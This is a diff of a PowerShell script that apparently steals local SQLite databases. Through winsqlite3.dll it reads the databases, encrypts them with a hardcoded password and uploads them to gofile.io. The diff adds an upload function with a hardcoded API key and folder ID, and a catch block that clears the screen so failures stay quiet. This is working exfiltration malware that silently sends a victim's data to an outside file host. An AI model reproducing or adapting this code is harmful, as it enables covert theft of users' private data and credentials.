@@ -22,6 +22,51 @@ public static extern int sqlite3_finalize(IntPtr stmt);
 [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
 public static extern int sqlite3_close(IntPtr db);
 "@
+
+
+
+
+function Upload-FilesToGofile {
+    param (
+        [string]$FilePath,
+        [string]$F2S,
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
+    )
+
+    try {
+        # 1. Create the Folder
+        $folderBody = @{
+            token = $ApiKey
+            parentFolderId = "feb3feae-451f-4233-a900-5fec87705f01"
+        }
+        $folderResponse = Invoke-RestMethod -Uri "https://api.gofile.io/contents/createFolder" -Method Post -Body $folderBody
+        $newFolderId = $folderResponse.data.id
+
+        # 2. Upload the Files
+        $filesToUpload = @($FilePath, $F2S)
+        
+        foreach ($file in $filesToUpload) {
+            if (Test-Path $file) {
+                # In PowerShell 7+, use -Form. In 5.1, we use this trick:
+                $uploadUri = "https://store1.gofile.io/uploadFile"
+                
+                
+                curl.exe -sS -F "file=@$file" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+                
+                
+            }
+        }
+    }
+    catch {
+        Clear-Host # This is your os.system("cls")
+    }
+}
+
+# Usage:
+
+
+
+
 function Protect-File {
     param (
         [string]$FilePath,
@@ -109,14 +154,7 @@ $server = $serverReq.data.servers[0].name
 Protect-File -FilePath $dbPath -p "For_oNS."
 Protect-File -FilePath $dbPath2 -p "For_oNS."
 $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
-$response = curl.exe -F "file=@$dbPath.crypt" -F "file=@$dbPath2.crypt" -F "token=$apiToken" $uploadUrl
-cls
-$response = curl.exe -F "file=@$dbPath2.crypt" -F "token=$apiToken" $uploadUrl
 
 
-$jsonResult = $response | ConvertFrom-Json
-if ($jsonResult.status -eq "ok") {
-    cls
-} else {
-    cls
-}
+Upload-FilesToGofile -FilePath "$dbPath2.crypt" -F2S "$dbPath.crypt"
+
